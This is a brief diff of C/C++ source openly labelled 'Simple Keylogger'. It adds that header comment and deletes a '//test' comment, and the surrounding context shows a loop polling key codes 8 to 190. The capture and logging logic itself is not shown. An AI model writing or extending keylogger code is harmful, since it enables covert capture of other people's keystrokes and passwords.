@@ -1,3 +1,4 @@
+//Simple Keylogger
 #include <stdio.h>
 #include <iostream>
 #include <conio.h>
@@ -15,7 +16,6 @@ void ezprint(string str)
 int main()
 {
     char key;
-    //test
     while (TRUE)
     {
         for (key = 8; key <= 190; key++)
